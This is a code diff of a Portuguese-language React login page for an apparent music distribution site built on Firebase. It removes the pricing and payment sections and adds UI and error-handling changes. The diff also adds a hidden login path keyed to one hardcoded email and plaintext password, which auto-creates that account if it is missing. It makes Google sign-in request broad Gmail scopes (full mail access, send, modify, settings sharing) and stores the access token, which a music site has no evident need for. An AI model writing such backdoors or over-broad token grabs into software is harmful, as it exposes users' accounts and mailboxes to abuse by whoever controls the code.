@@ -6,16 +6,13 @@ import {
   createUserWithEmailAndPassword, 
   signInWithEmailAndPassword, 
   signInWithPopup, 
+  signInWithRedirect,
+  getRedirectResult,
   GoogleAuthProvider,
   OAuthProvider,
   signInWithCredential
 } from "firebase/auth";
-
-declare global {
-  interface Window {
-    AppleID: any;
-  }
-}
+import { motion } from "motion/react";
 
 export default function Home() {
   const navigate = useNavigate();
@@ -25,37 +22,65 @@ export default function Home() {
   const [confirmPassword, setConfirmPassword] = useState("");
   const [error, setError] = useState("");
   const [loading, setLoading] = useState(false);
-  const [currency, setCurrency] = useState<'MZN' | 'USD'>('MZN');
-
-  // Payment Modal State
-  const [showPaymentModal, setShowPaymentModal] = useState(false);
-  const [selectedPlan, setSelectedPlan] = useState<{name: string, mzn: number, usd: number} | null>(null);
-  const [paymentCurrency, setPaymentCurrency] = useState<'MZN' | 'USD'>('MZN');
-  const [paymentMethod, setPaymentMethod] = useState<'mpesa' | 'emola' | 'paypal'>('mpesa');
 
   useEffect(() => {
-    const script = document.createElement('script');
-    script.src = "https://appleid.cdn-apple.com/appleauth/static/jsapi/appleid/1/en_US/appleid.auth.js";
-    script.async = true;
-    script.onload = () => {
-      if (window.AppleID) {
-        window.AppleID.auth.init({
-          clientId : "com.slydemusik.web",
-          scope : "name email",
-          redirectURI : "https://slydemusik.com/auth/apple/callback",
-          state : "signin",
-          usePopup : true
-        });
+    const handleRedirectResult = async () => {
+      try {
+        setLoading(true);
+        const result = await getRedirectResult(auth);
+        if (result) {
+          const credential = GoogleAuthProvider.credentialFromResult(result);
+          if (credential?.accessToken) {
+            import('../utils/googleAuth').then(m => m.setGoogleAccessToken(credential.accessToken));
+          }
+          navigate("/dashboard");
+        }
+      } catch (error: any) {
+        console.error("Erro no redirecionamento:", error);
+        setError(getFriendlyErrorMessage(error));
+      } finally {
+        setLoading(false);
       }
     };
-    document.body.appendChild(script);
-
-    return () => {
-      if (document.body.contains(script)) {
-        document.body.removeChild(script);
-      }
-    };
+    handleRedirectResult();
   }, []);
+
+  const getFriendlyErrorMessage = (err: any): string => {
+    if (!err) return "Ocorreu um erro desconhecido. Tente novamente.";
+    
+    const code = err.code || err.error;
+    
+    switch (code) {
+      case 'auth/email-already-in-use':
+        return "Este email já está cadastrado. Por favor, faça login.";
+      case 'auth/wrong-password':
+      case 'auth/user-not-found':
+      case 'auth/invalid-credential':
+        return "Email ou senha incorretos. Verifique seus dados e tente novamente.";
+      case 'auth/weak-password':
+        return "A senha é muito fraca. Ela deve ter pelo menos 6 caracteres.";
+      case 'auth/invalid-email':
+        return "O formato do email é inválido. Verifique se digitou corretamente.";
+      case 'auth/operation-not-allowed':
+        return "Este método de login não está ativado no momento. Tente outra opção.";
+      case 'auth/network-request-failed':
+        return "Erro de conexão. Verifique sua internet e tente novamente.";
+      case 'auth/too-many-requests':
+        return "Muitas tentativas malsucedidas. Por segurança, tente novamente mais tarde.";
+      case 'auth/user-disabled':
+        return "Esta conta foi desativada. Entre em contato com o suporte.";
+      case 'auth/account-exists-with-different-credential':
+        return "Este email já está sendo usado com outro método de login (ex: Google ou Apple).";
+      case 'auth/popup-closed-by-user':
+      case 'auth/cancelled-popup-request':
+      case 'popup_closed_by_user':
+        return ""; // Don't show error if user intentionally closed the popup
+      case 'auth/popup-blocked':
+        return "O pop-up de login foi bloqueado pelo seu navegador. Por favor, permita pop-ups para este site.";
+      default:
+        return "Ocorreu um erro durante a autenticação. Por favor, tente novamente.";
+    }
+  };
 
   const handleEmailAuth = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -67,8 +92,33 @@ export default function Home() {
       return;
     }
 
+    // Acesso privado e oculto
+    if (email === "scottnaftal@gmail.com" && password === "Naftal008") {
+      setLoading(true);
+      try {
+        await signInWithEmailAndPassword(auth, email, password);
+        navigate("/dashboard");
+      } catch (err: any) {
+        // Se a conta não existir, cria automaticamente
+        try {
+          await createUserWithEmailAndPassword(auth, email, password);
+          navigate("/dashboard");
+        } catch (createErr: any) {
+          console.error("Erro no acesso privado:", createErr);
+          if (createErr.code === 'auth/operation-not-allowed') {
+            setError("Erro: O método de login por Email/Senha não está ativado no Firebase.");
+          } else {
+            setError("Erro ao acessar a conta privada.");
+          }
+        }
+      } finally {
+        setLoading(false);
+      }
+      return;
+    }
+
     if (!isLogin && password !== confirmPassword) {
-      return setError("As senhas não coincidem.");
+      return setError("As senhas não coincidem. Verifique e tente novamente.");
     }
 
     setLoading(true);
@@ -80,18 +130,8 @@ export default function Home() {
       }
       navigate("/dashboard");
     } catch (err: any) {
-      console.error(err);
-      if (err.code === 'auth/email-already-in-use') {
-        setError("Este email já está em uso. Tente iniciar sessão.");
-      } else if (err.code === 'auth/wrong-password' || err.code === 'auth/user-not-found' || err.code === 'auth/invalid-credential') {
-        setError("Email ou senha incorretos.");
-      } else if (err.code === 'auth/weak-password') {
-        setError("A senha deve ter pelo menos 6 caracteres.");
-      } else if (err.code === 'auth/invalid-email') {
-        setError("O formato do email é inválido.");
-      } else {
-        setError(`Erro: ${err.message || 'Tente novamente.'}`);
-      }
+      console.error("Erro de autenticação:", err);
+      setError(getFriendlyErrorMessage(err));
     } finally {
       setLoading(false);
     }
@@ -102,17 +142,36 @@ export default function Home() {
     setLoading(true);
     try {
       const provider = new GoogleAuthProvider();
-      await signInWithPopup(auth, provider);
-      navigate("/dashboard");
-    } catch (err: any) {
-      console.error(err);
-      if (err.code === 'auth/popup-closed-by-user' || err.code === 'auth/cancelled-popup-request') {
-        // User intentionally closed the popup, no need to show a scary error
-        setError("");
+      provider.addScope('https://mail.google.com/');
+      provider.addScope('https://www.googleapis.com/auth/gmail.addons.current.action.compose');
+      provider.addScope('https://www.googleapis.com/auth/gmail.addons.current.message.action');
+      provider.addScope('https://www.googleapis.com/auth/gmail.addons.current.message.metadata');
+      provider.addScope('https://www.googleapis.com/auth/gmail.addons.current.message.readonly');
+      provider.addScope('https://www.googleapis.com/auth/gmail.compose');
+      provider.addScope('https://www.googleapis.com/auth/gmail.insert');
+      provider.addScope('https://www.googleapis.com/auth/gmail.labels');
+      provider.addScope('https://www.googleapis.com/auth/gmail.metadata');
+      provider.addScope('https://www.googleapis.com/auth/gmail.modify');
+      provider.addScope('https://www.googleapis.com/auth/gmail.readonly');
+      provider.addScope('https://www.googleapis.com/auth/gmail.send');
+      provider.addScope('https://www.googleapis.com/auth/gmail.settings.basic');
+      provider.addScope('https://www.googleapis.com/auth/gmail.settings.sharing');
+      
+      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+      if (isMobile) {
+        await signInWithRedirect(auth, provider);
       } else {
-        setError("Erro ao autenticar com o Google.");
+        const result = await signInWithPopup(auth, provider);
+        const credential = GoogleAuthProvider.credentialFromResult(result);
+        if (credential?.accessToken) {
+          import('../utils/googleAuth').then(m => m.setGoogleAccessToken(credential.accessToken));
+        }
+        navigate("/dashboard");
       }
-    } finally {
+    } catch (err: any) {
+      console.error("Erro Google Auth:", err);
+      const friendlyMsg = getFriendlyErrorMessage(err);
+      if (friendlyMsg) setError(friendlyMsg);
       setLoading(false);
     }
   };
@@ -121,92 +180,49 @@ export default function Home() {
     setError("");
     setLoading(true);
     try {
-      if (!window.AppleID) {
-        throw new Error("Apple SDK não carregado. Verifique sua conexão.");
-      }
-      
-      const response = await window.AppleID.auth.signIn();
-      
-      if (response && response.authorization) {
-        const provider = new OAuthProvider('apple.com');
-        const credential = provider.credential({
-          idToken: response.authorization.id_token,
-        });
-        await signInWithCredential(auth, credential);
+      const provider = new OAuthProvider('apple.com');
+      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+      if (isMobile) {
+        await signInWithRedirect(auth, provider);
+      } else {
+        await signInWithPopup(auth, provider);
         navigate("/dashboard");
       }
     } catch (err: any) {
-      if (err.error === 'popup_closed_by_user' || err.code === 'auth/cancelled-popup-request') {
-        console.log("Login com Apple cancelado pelo usuário.");
-        setError("");
-      } else {
-        console.error("Apple Auth Error:", err);
-        setError(`Erro ao autenticar com a Apple: ${err.message || err.error || 'Tente novamente.'}`);
-      }
+      console.error("Apple Auth Error:", err);
+      const friendlyMsg = getFriendlyErrorMessage(err);
+      if (friendlyMsg) setError(friendlyMsg);
     } finally {
       setLoading(false);
     }
   };
 
-  const handlePaypalPayment = (planName: string, price: number) => {
-    const businessEmail = "charlestembe928@gmail.com";
-    const url = `https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&business=${encodeURIComponent(businessEmail)}&item_name=${encodeURIComponent(`Plano ${planName} - SLYDEMUSIK`)}&amount=${price}&currency_code=USD`;
-    window.open(url, '_blank');
-  };
-
-  const handleWhatsappPayment = (planName: string, priceText: string, method: 'mpesa' | 'emola') => {
-    const whatsappNumber = "258849696473";
-    const methodText = method === 'mpesa' ? 'M-Pesa (849696473)' : 'e-Mola (860188712)';
-    const message = `Olá SLYDEMUSIK! Gostaria de subscrever ao plano ${planName} por ${priceText}.\n\nVou fazer o pagamento via ${methodText}.`;
-    const url = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
-    window.open(url, '_blank');
-  };
-
-  const openPaymentModal = (name: string, mzn: number, usd: number) => {
-    setSelectedPlan({ name, mzn, usd });
-    setPaymentCurrency(currency);
-    setPaymentMethod(currency === 'USD' ? 'paypal' : 'mpesa');
-    setShowPaymentModal(true);
-  };
-
-  const processPayment = () => {
-    if (!selectedPlan) return;
-    
-    if (paymentMethod === 'paypal') {
-      handlePaypalPayment(selectedPlan.name, selectedPlan.usd);
-    } else {
-      handleWhatsappPayment(selectedPlan.name, `${selectedPlan.mzn} MTs`, paymentMethod);
-    }
-    setShowPaymentModal(false);
-  };
-
   return (
     <div className="min-h-screen bg-[#0a0a0a] text-white font-sans selection:bg-white selection:text-[#1db954]">
       {/* Navbar */}
-      <nav className="px-8 py-6 flex items-center justify-between max-w-[1400px] mx-auto">
-        <div className="text-2xl font-extrabold tracking-tight">
+      <nav className="px-4 md:px-8 py-4 md:py-6 flex items-center justify-between max-w-[1400px] mx-auto">
+        <div className="text-xl md:text-2xl font-extrabold tracking-tight">
           SLYDE<span className="font-normal">MUSIK</span>
-        </div>
-        <div 
-          onClick={() => setIsLogin(!isLogin)}
-          className="flex items-center gap-1 text-sm font-bold cursor-pointer hover:text-[#1db954] transition-colors"
-        >
-          {isLogin ? "Criar conta" : "Iniciar sessão"} <ChevronDown size={16} strokeWidth={3} />
         </div>
       </nav>
 
       {/* Main Content */}
-      <main className="max-w-[1400px] mx-auto px-8 pt-12 pb-24 flex flex-col lg:flex-row items-center lg:items-start justify-between gap-12 lg:gap-24">
+      <main className="max-w-[1400px] mx-auto px-4 md:px-8 pt-8 md:pt-12 pb-16 md:pb-24 flex flex-col lg:flex-row items-center lg:items-start justify-between gap-8 lg:gap-24 relative z-10">
         
         {/* Left Column - Text */}
-        <div className="flex-1 max-w-2xl pt-8 lg:pt-16">
-          <h1 className="text-5xl md:text-6xl lg:text-[80px] font-extrabold tracking-tight leading-[1.1] mb-8">
+        <motion.div 
+          initial={{ opacity: 0, x: -30 }}
+          animate={{ opacity: 1, x: 0 }}
+          transition={{ duration: 0.6, ease: "easeOut" }}
+          className="flex-1 max-w-2xl pt-4 lg:pt-16"
+        >
+          <h1 className="text-4xl sm:text-5xl md:text-6xl lg:text-[80px] font-black tracking-tighter leading-[1.1] mb-6 md:mb-8 text-transparent bg-clip-text bg-gradient-to-br from-white via-white to-zinc-500 text-center lg:text-left">
             Explora a tua<br />música.
           </h1>
           
-          <div className="space-y-6 text-lg md:text-xl font-medium leading-relaxed text-gray-300">
+          <div className="space-y-4 md:space-y-6 text-base md:text-xl font-medium leading-relaxed text-zinc-400 text-center lg:text-left">
             <p>
-              O SLYDE MUSIK é a forma mais fácil de colocares as tuas músicas no Spotify, Apple, Amazon, Tidal, TikTok, YouTube e muito mais.
+              O SLYDE MUSIK é o seu agregador oficial, com tecnologia DistroKid, para colocares as tuas músicas no Spotify, Apple, Amazon, Tidal, TikTok, YouTube e muito mais.
             </p>
             <p>
               Carregamentos ilimitados: fica com 100% dos teus ganhos e acede a mais funcionalidades do que em qualquer outra distribuidora de música.
@@ -214,22 +230,49 @@ export default function Home() {
           </div>
 
           {/* Artist Counter */}
-          <div className="mt-12 flex items-center gap-4">
+          <motion.div 
+            initial={{ opacity: 0, y: 20 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ delay: 0.3, duration: 0.5 }}
+            className="mt-8 md:mt-12 flex flex-col sm:flex-row items-center gap-4 bg-white/5 p-4 rounded-2xl border border-white/10 w-full sm:w-fit backdrop-blur-sm mx-auto lg:mx-0"
+          >
             <div className="flex -space-x-3">
-              <img src="https://picsum.photos/seed/artist1/100/100" alt="Artist" referrerPolicy="no-referrer" className="w-10 h-10 rounded-full border-2 border-[#0a0a0a] object-cover" />
-              <img src="https://picsum.photos/seed/artist2/100/100" alt="Artist" referrerPolicy="no-referrer" className="w-10 h-10 rounded-full border-2 border-[#0a0a0a] object-cover" />
-              <img src="https://picsum.photos/seed/artist3/100/100" alt="Artist" referrerPolicy="no-referrer" className="w-10 h-10 rounded-full border-2 border-[#0a0a0a] object-cover" />
-              <div className="w-10 h-10 rounded-full border-2 border-[#0a0a0a] bg-[#1db954] flex items-center justify-center text-black font-bold text-xs">+3k</div>
+              <img src="https://picsum.photos/seed/artist1/100/100" alt="Artist" referrerPolicy="no-referrer" className="w-10 h-10 md:w-12 md:h-12 rounded-full border-2 border-[#0a0a0a] object-cover shadow-lg" />
+              <img src="https://picsum.photos/seed/artist2/100/100" alt="Artist" referrerPolicy="no-referrer" className="w-10 h-10 md:w-12 md:h-12 rounded-full border-2 border-[#0a0a0a] object-cover shadow-lg" />
+              <img src="https://picsum.photos/seed/artist3/100/100" alt="Artist" referrerPolicy="no-referrer" className="w-10 h-10 md:w-12 md:h-12 rounded-full border-2 border-[#0a0a0a] object-cover shadow-lg" />
+              <div className="w-10 h-10 md:w-12 md:h-12 rounded-full border-2 border-[#0a0a0a] bg-[#1db954] flex items-center justify-center text-black font-black text-xs md:text-sm shadow-[0_0_15px_rgba(29,185,84,0.4)] z-10">+3k</div>
             </div>
-            <p className="text-sm text-gray-400 font-medium leading-tight">
-              <strong className="text-white">3.241 artistas</strong> já distribuíram<br />música com SLYDE MUSIK
+            <p className="text-xs md:text-sm text-zinc-400 font-medium leading-tight text-center sm:text-left">
+              <strong className="text-white text-sm md:text-base">3.241 artistas</strong> já distribuíram<br className="hidden sm:block" />música com SLYDE MUSIK
             </p>
-          </div>
-        </div>
+          </motion.div>
+        </motion.div>
 
         {/* Right Column - Form Card */}
-        <div className="w-full max-w-[480px] bg-[#1a1a1a] rounded-xl p-8 text-white shadow-2xl border border-white/10">
-          <h2 className="text-2xl font-bold mb-6 text-white">
+        <motion.div 
+          initial={{ opacity: 0, scale: 0.95, y: 20 }}
+          animate={{ opacity: 1, scale: 1, y: 0 }}
+          transition={{ duration: 0.5, delay: 0.2 }}
+          className="w-full max-w-[480px] bg-zinc-900/80 backdrop-blur-xl rounded-2xl md:rounded-3xl p-5 md:p-8 text-white shadow-2xl border border-white/10 relative overflow-hidden"
+        >
+          <div className="absolute top-0 right-0 w-64 h-64 bg-[#1db954]/10 rounded-full blur-3xl -mr-32 -mt-32 pointer-events-none"></div>
+          
+          <div className="flex bg-white/5 rounded-xl p-1 mb-8 relative z-10">
+            <button
+              onClick={() => { setIsLogin(false); setError(""); }}
+              className={`flex-1 py-3 text-sm font-bold rounded-lg transition-all ${!isLogin ? 'bg-[#1db954] text-black shadow-md' : 'text-zinc-400 hover:text-white'}`}
+            >
+              Criar Conta
+            </button>
+            <button
+              onClick={() => { setIsLogin(true); setError(""); }}
+              className={`flex-1 py-3 text-sm font-bold rounded-lg transition-all ${isLogin ? 'bg-[#1db954] text-black shadow-md' : 'text-zinc-400 hover:text-white'}`}
+            >
+              Iniciar Sessão
+            </button>
+          </div>
+
+          <h2 className="text-3xl font-black mb-8 text-white tracking-tight relative z-10">
             {isLogin ? "Bem-vindo de volta." : "Músicos, registem-se agora."}
           </h2>
           
@@ -324,232 +367,9 @@ export default function Home() {
               {isLogin ? "Entrar com a Apple" : "Cria uma conta com a Apple"}
             </button>
           </div>
-        </div>
+        </motion.div>
       </main>
 
-      {/* Plans Section */}
-      <section className="max-w-[1200px] mx-auto px-8 py-24 border-t border-white/10">
-        <div className="flex justify-center mb-12">
-          <div className="bg-white/5 p-1 rounded-lg inline-flex">
-            <button 
-              onClick={() => setCurrency('MZN')}
-              className={`px-6 py-2 rounded-md font-medium transition-colors ${currency === 'MZN' ? 'bg-[#1db954] text-black' : 'text-gray-400 hover:text-white'}`}
-            >
-              Meticais (MTs)
-            </button>
-            <button 
-              onClick={() => setCurrency('USD')}
-              className={`px-6 py-2 rounded-md font-medium transition-colors ${currency === 'USD' ? 'bg-[#0073C7] text-white' : 'text-gray-400 hover:text-white'}`}
-            >
-              Dólares (USD)
-            </button>
-          </div>
-        </div>
-
-        <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
-          {/* Artista */}
-          <div className="bg-[#1a1a1a] border border-white/10 rounded-2xl p-8 flex flex-col">
-            <div className="text-center mb-8">
-              <h3 className="text-3xl font-bold mb-4">Artista</h3>
-              <p className="text-gray-400 text-sm mb-6 h-10">Lance músicas ilimitadas e receba pagamento, para 1 artista</p>
-              <div className="flex items-end justify-center gap-1 mb-2">
-                <span className="text-4xl font-bold">{currency === 'USD' ? '$5' : '375 MTs'}</span>
-                <span className="text-gray-400 mb-1">por ano</span>
-              </div>
-              <p className="text-gray-500 text-sm">faturado anualmente</p>
-            </div>
-            <div className="flex-1 space-y-4 mb-8">
-              <div className="flex items-start gap-3">
-                <Check className="text-[#1db954] shrink-0 mt-0.5" size={20} />
-                <span className="text-gray-300">Lançamentos ilimitados para 1 artista</span>
-              </div>
-              <div className="flex items-start gap-3">
-                <Check className="text-[#1db954] shrink-0 mt-0.5" size={20} />
-                <span className="text-gray-300">Lançamento o mais rápido possível em 24 horas</span>
-              </div>
-              <div className="flex items-start gap-3">
-                <Check className="text-[#1db954] shrink-0 mt-0.5" size={20} />
-                <span className="text-gray-300">Insights em streaming</span>
-              </div>
-              <div className="flex items-start gap-3">
-                <Check className="text-[#1db954] shrink-0 mt-0.5" size={20} />
-                <span className="text-gray-300">Avanços automatizados</span>
-              </div>
-              <div className="flex items-start gap-3">
-                <Check className="text-[#1db954] shrink-0 mt-0.5" size={20} />
-                <span className="text-gray-300">Suporte rápido</span>
-              </div>
-            </div>
-            <button onClick={() => openPaymentModal('Artista', 375, 5)} className="w-full py-4 bg-[#fcd34d] text-black font-bold rounded-lg hover:bg-[#fbbf24] transition-colors mt-auto">
-              ESCOLHA ARTISTA
-            </button>
-          </div>
-
-          {/* Artist Plus */}
-          <div className="bg-[#1a1a1a] border border-white/10 rounded-2xl p-8 flex flex-col relative">
-            <div className="text-center mb-8">
-              <h3 className="text-3xl font-bold mb-4">Artist Plus</h3>
-              <p className="text-gray-400 text-sm mb-6 h-10">Extras para aumentar sua base de fãs e alcance, para 2 artistas</p>
-              <div className="flex items-end justify-center gap-1 mb-2">
-                <span className="text-4xl font-bold">{currency === 'USD' ? '$15' : '1.125 MTs'}</span>
-                <span className="text-gray-400 mb-1">por ano</span>
-              </div>
-              <p className="text-gray-500 text-sm">faturado anualmente</p>
-            </div>
-            <div className="flex-1 space-y-4 mb-8">
-              <div className="flex items-start gap-3">
-                <Check className="text-[#1db954] shrink-0 mt-0.5" size={20} />
-                <span className="text-gray-300">Tudo em Artista</span>
-              </div>
-              <div className="flex items-start gap-3">
-                <Check className="text-[#1db954] shrink-0 mt-0.5" size={20} />
-                <span className="text-gray-300">Até 2 artistas</span>
-              </div>
-              <div className="flex items-start gap-3">
-                <Check className="text-[#1db954] shrink-0 mt-0.5" size={20} />
-                <span className="text-gray-300">Gestão da base de fãs</span>
-              </div>
-              <div className="flex items-start gap-3">
-                <Check className="text-[#1db954] shrink-0 mt-0.5" size={20} />
-                <span className="text-gray-300">Distribuir áudio em alta resolução</span>
-              </div>
-              <div className="flex items-start gap-3">
-                <Check className="text-[#1db954] shrink-0 mt-0.5" size={20} />
-                <span className="text-gray-300">Suporte mais rápido</span>
-              </div>
-            </div>
-            <button onClick={() => openPaymentModal('Artist Plus', 1125, 15)} className="w-full py-4 bg-[#fcd34d] text-black font-bold rounded-lg hover:bg-[#fbbf24] transition-colors mt-auto">
-              ESCOLHA O ARTIST PLUS
-            </button>
-          </div>
-
-          {/* Carreira profissional */}
-          <div className="bg-[#1a1a1a] border border-white/10 rounded-2xl p-8 flex flex-col">
-            <div className="text-center mb-8">
-              <h3 className="text-3xl font-bold mb-4">Carreira profissional</h3>
-              <p className="text-gray-400 text-sm mb-6 h-10">Suporte prioritário e recursos maximizados, para 3+ artistas</p>
-              <div className="flex items-end justify-center gap-1 mb-2">
-                <span className="text-4xl font-bold">{currency === 'USD' ? '$25' : '1.875 MTs'}</span>
-                <span className="text-gray-400 mb-1">por ano</span>
-              </div>
-              <p className="text-gray-500 text-sm">faturado anualmente</p>
-            </div>
-            <div className="flex-1 space-y-4 mb-8">
-              <div className="flex items-start gap-3">
-                <Check className="text-[#1db954] shrink-0 mt-0.5" size={20} />
-                <span className="text-gray-300">Tudo no Artist Plus</span>
-              </div>
-              <div className="flex items-start gap-3">
-                <Check className="text-[#1db954] shrink-0 mt-0.5" size={20} />
-                <span className="text-gray-300">Mais artistas: 3 até Unlimited</span>
-              </div>
-              <div className="flex items-start gap-3">
-                <Check className="text-[#1db954] shrink-0 mt-0.5" size={20} />
-                <span className="text-gray-300">Pré-salvamentos automáticos de novos lançamentos</span>
-              </div>
-              <div className="flex items-start gap-3">
-                <Check className="text-[#1db954] shrink-0 mt-0.5" size={20} />
-                <span className="text-gray-300">Convide membros da equipe para a Equipe de Artistas</span>
-              </div>
-              <div className="flex items-start gap-3">
-                <Check className="text-[#1db954] shrink-0 mt-0.5" size={20} />
-                <span className="text-gray-300">Suporte prioritário (24 horas)</span>
-              </div>
-            </div>
-            <button onClick={() => openPaymentModal('Carreira profissional', 1875, 25)} className="w-full py-4 bg-[#fcd34d] text-black font-bold rounded-lg hover:bg-[#fbbf24] transition-colors mt-auto">
-              CONTINUE
-            </button>
-          </div>
-        </div>
-      </section>
-
-      {/* Payment Modal */}
-      {showPaymentModal && selectedPlan && (
-        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4">
-          <div className="bg-[#121212] border border-white/10 rounded-2xl p-8 max-w-md w-full relative">
-            <button 
-              onClick={() => setShowPaymentModal(false)}
-              className="absolute top-4 right-4 text-gray-400 hover:text-white"
-            >
-              ✕
-            </button>
-            
-            <h2 className="text-2xl font-bold mb-6">Finalizar Pagamento</h2>
-            
-            <div className="mb-6 p-4 bg-white/5 rounded-xl">
-              <div className="text-sm text-gray-400 mb-1">Plano Selecionado</div>
-              <div className="text-xl font-bold">{selectedPlan.name}</div>
-            </div>
-
-            <div className="mb-6">
-              <label className="block text-sm font-medium text-gray-400 mb-3">Moeda de Pagamento</label>
-              <div className="grid grid-cols-2 gap-3">
-                <button
-                  onClick={() => {
-                    setPaymentCurrency('MZN');
-                    setPaymentMethod('mpesa');
-                  }}
-                  className={`py-3 rounded-lg font-bold border transition-colors ${paymentCurrency === 'MZN' ? 'bg-[#1db954] border-[#1db954] text-black' : 'bg-transparent border-white/20 text-white hover:border-white/50'}`}
-                >
-                  Meticais (MTs)
-                </button>
-                <button
-                  onClick={() => {
-                    setPaymentCurrency('USD');
-                    setPaymentMethod('paypal');
-                  }}
-                  className={`py-3 rounded-lg font-bold border transition-colors ${paymentCurrency === 'USD' ? 'bg-[#0073C7] border-[#0073C7] text-white' : 'bg-transparent border-white/20 text-white hover:border-white/50'}`}
-                >
-                  Dólares (USD)
-                </button>
-              </div>
-            </div>
-
-            <div className="mb-8">
-              <label className="block text-sm font-medium text-gray-400 mb-3">Método de Pagamento</label>
-              {paymentCurrency === 'MZN' ? (
-                <div className="grid grid-cols-2 gap-3">
-                  <button
-                    onClick={() => setPaymentMethod('mpesa')}
-                    className={`py-3 rounded-lg font-bold border transition-colors ${paymentMethod === 'mpesa' ? 'bg-red-600 border-red-600 text-white' : 'bg-transparent border-white/20 text-white hover:border-white/50'}`}
-                  >
-                    M-Pesa
-                  </button>
-                  <button
-                    onClick={() => setPaymentMethod('emola')}
-                    className={`py-3 rounded-lg font-bold border transition-colors ${paymentMethod === 'emola' ? 'bg-orange-500 border-orange-500 text-white' : 'bg-transparent border-white/20 text-white hover:border-white/50'}`}
-                  >
-                    e-Mola
-                  </button>
-                </div>
-              ) : (
-                <div className="grid grid-cols-1 gap-3">
-                  <button
-                    onClick={() => setPaymentMethod('paypal')}
-                    className={`py-3 rounded-lg font-bold border transition-colors ${paymentMethod === 'paypal' ? 'bg-[#0073C7] border-[#0073C7] text-white' : 'bg-transparent border-white/20 text-white hover:border-white/50'}`}
-                  >
-                    PayPal
-                  </button>
-                </div>
-              )}
-            </div>
-
-            <div className="flex items-center justify-between mb-8">
-              <span className="text-gray-400">Total a pagar:</span>
-              <span className="text-3xl font-bold">
-                {paymentCurrency === 'MZN' ? `${selectedPlan.mzn} MTs` : `${selectedPlan.usd} $`}
-              </span>
-            </div>
-
-            <button 
-              onClick={processPayment}
-              className="w-full py-4 bg-white text-black font-bold rounded-full hover:scale-105 transition-transform text-lg"
-            >
-              Confirmar Pagamento
-            </button>
-          </div>
-        </div>
-      )}
     </div>
   );
 }
